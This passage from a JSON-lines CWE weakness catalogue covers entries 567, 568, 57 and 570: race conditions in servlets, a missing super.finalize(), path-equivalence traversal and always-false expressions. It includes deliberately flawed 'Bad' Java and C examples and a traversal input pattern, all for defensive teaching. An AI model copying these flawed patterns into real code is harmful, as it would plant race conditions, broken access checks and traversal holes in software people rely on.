"Reasons": ["Acceptable-Use"]}}
{"ID": "567", "Name": "Unsynchronized Access to Shared Data in a Multithreaded Context", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.", "ExtendedDescription": "\n\nWithin servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.\n\n\nNote that this weakness is not unique to servlets.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "820", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1340", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "488", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Read Application Data", "Modify Application Data", "DoS: Instability", "DoS: Crash, Exit, or Restart"], "Note": "If the shared variable contains sensitive data, it may be manipulated or displayed in another user session. If this data is used to control the application, its value can be manipulated to cause the application to crash or perform poorly."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Remove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code implements a basic counter for how many times the page has been accesed."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic static class Counter extends HttpServlet {\n\t\tstatic int count = 0;\n\t\tprotected void doGet(HttpServletRequest in, HttpServletResponse out)\n\t\tthrows ServletException, IOException {\n\t\t\tout.setContentType(\"text/plain\");\n\t\t\tPrintWriter p = out.getWriter();\n\t\t\tcount++;\n\t\t\tp.println(count + \" hits so far!\");\n\t\t}\n\t}\n```"}, {"BodyText": "Consider when two separate threads, Thread A and Thread B, concurrently handle two different requests:"}, {"BodyText": "- Assume this is the first occurrence of doGet, so the value of count is 0.\n\n  - doGet() is called within Thread A.\n\n  - The execution of doGet() in Thread A continues to the point AFTER the value of the count variable is read, then incremented, but BEFORE it is saved back to count. At this stage, the incremented value is 1, but the value of count is 0.\n\n  - doGet() is called within Thread B, and due to a higher thread priority, Thread B progresses to the point where the count variable is accessed (where it is still 0), incremented, and saved. After the save, count is 1.\n\n  - Thread A continues. It saves the intermediate, incremented value to the count variable - but the incremented value is 1, so count is \"re-saved\" to 1."}, {"BodyText": "At this point, both Thread A and Thread B print that one hit has been seen, even though two separate requests have been processed. The value of count should be 2, not 1."}, {"BodyText": "While this example does not have any real serious implications, if the shared variable in question is used for resource tracking, then resource consumption could occur. Other scenarios exist."}]}], "RelatedAttackPatterns": ["25"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "568", "Name": "finalize() Method Without super.finalize()", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product contains a finalize() method that does not call super.finalize().", "ExtendedDescription": "The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "573", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "459", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Call the super.finalize() method."}, {"Phase": ["Testing"], "Description": "Use static analysis tools to spot such issues in your code."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following method omits the call to super.finalize()."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprotected void finalize() {\n\t\tdiscardNative();\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "57", "Name": "Path Equivalence: 'fakedir/../realdir/filename'", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2001-1152", "Description": "Proxy allows remote attackers to bypass denylist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1152"}, {"Reference": "CVE-2000-0191", "Description": "application check access for restricted URL before canonicalization", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0191"}, {"Reference": "CVE-2005-1366", "Description": "CGI source disclosure using \"dirname/../cgi-bin\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1366"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Theoretical", "Note": "This is a manipulation that uses an injection for one consequence (containment violation using relative path) to achieve a different consequence (equivalence by alternate name)."}]}
{"ID": "570", "Name": "Expression is Always False", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product contains an expression that will always evaluate to false.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "561", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation", "Varies by Context"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Use Static Analysis tools to spot such conditions."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the updateUserAccountOrder() method used within an e-business product ordering/inventory application will validate the product number that was ordered and the user account number. If they are valid, the method will update the product inventory, the user account, and the user order appropriately."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic void updateUserAccountOrder(String productNumber, String accountNumber) {\n\t\t\tboolean isValidProduct = false;\n\t\t\tboolean isValidAccount = false;\n\t\t\tif (validProductNumber(productNumber)) {\n\t\t\t\tisValidProduct = true;\n\t\t\t\tupdateInventory(productNumber);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (validAccountNumber(accountNumber)) {\n\t\t\t\tisValidProduct = true;\n\t\t\t\tupdateAccount(accountNumber, productNumber);\n\t\t\t}\n\t\t\tif (isValidProduct && isValidAccount) {\n\t\t\t\tupdateAccountOrder(accountNumber, productNumber);\n\t\t\t}\n\t}\n```"}, {"BodyText": "However, the method never sets the isValidAccount variable after initializing it to false so the isValidProduct is mistakenly used twice. The result is that the expression \"isValidProduct && isValidAccount\" will always evaluate to false, so the updateAccountOrder() method will never be invoked. This will create serious problems with the product ordering application since the user account and inventory databases will be updated but the order will not be updated."}, {"BodyText": "This can be easily corrected by updating the appropriate variable."}, {"Nature": "Good", "ExampleCode": "```\n\t...\n\tif (validAccountNumber(accountNumber)) {\n\t\tisValidAccount = true;\n\t\tupdateAccount(accountNumber, productNumber);\n\t}\n\t...\n```"}]}, {"Entries": [{"IntroText": "In the following example, the hasReadWriteAccess method uses bit masks and bit operators to determine if a user has read and write privileges for a particular process. The variable mask is defined as a bit mask from the BIT_READ and BIT_WRITE constants that have been defined. The variable mask is used within the predicate of the hasReadWriteAccess method to determine if the userMask input parameter has the read and write bits set."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#define BIT_READ 0x0001 // 00000001\n\t#define BIT_WRITE 0x0010 // 00010000\n\tunsigned int mask = BIT_READ & BIT_WRITE; /* intended to use \"|\" */\n\t// using \"&\", mask = 00000000\n\t// using \"|\", mask = 00010001\n\t// determine if user has read and write access\n\tint hasReadWriteAccess(unsigned int userMask) {\n\t\t\t// if the userMask has read and write bits set\n\t\t\t// then return 1 (true)\n\t\t\tif (userMask & mask) {\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t// otherwise return 0 (false)\n\t\t\treturn 0;\n\t}\n```"}, {"BodyText": "However the bit operator used to initialize the mask variable is the AND operator rather than the intended OR operator (CWE-480), this resulted in the variable mask being set to 0. As a result, the if statement will always evaluate to false and never get executed."}, {"BodyText": "The use of bit masks, bit operators and bitwise operations on variables can be difficult. If possible, try to use frameworks or libraries that provide appropriate functionality and abstract the implementation."}]}, {"Entries": [{"IntroText": "In the following example, the updateInventory method used within an e-business inventory application will update the inventory for a particular product. This method includes an if statement with an expression that will always evaluate to false. This is a common practice in C/C++ to introduce debugging statements quickly by simply changing the expression to evaluate to true and then removing those debugging statements by changing expression to evaluate to false. This is also a common practice for disabling features no longer needed."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint updateInventory(char* productNumber, int numberOfItems) {\n\t\t\tint initCount = getProductCount(productNumber);\n\t\t\tint updatedCount = initCount + numberOfItems;\n\t\t\tint updated = updateProductCount(updatedCount);\n\t\t\t// if statement for debugging purposes only\n\t\t\tif (1 == 0) {\n\t\t\t\t\tchar productName[128];\n\t\t\t\t\tproductName = getProductName(productNumber);\n\t\t\t\t\tprintf(\"product %s initially has %d items in inventory \\n\", productName, initCount);\n\t\t\t\t\tprintf(\"adding %d items to inventory for %s \\n\", numberOfItems, productName);\n\t\t\t\t\tif (updated == 0) {\n\t\t\t\t\t\tprintf(\"Inventory updated for product %s to %d items \\n\", productName, updatedCount);\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tprintf(\"Inventory not updated for product: %s \\n\", productName);\n\t\t\t\t\t}\n\t\t\t}\n\t\t\treturn updated;\n\t}\n```"}, {"BodyText": "Using this practice for introducing debugging statements or disabling features creates dead code that can cause problems during code maintenance and potentially introduce vulnerabilities. To avoid using expressions that evaluate to false for debugging purposes a logging API or debugging API should be used for the output of debugging messages."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
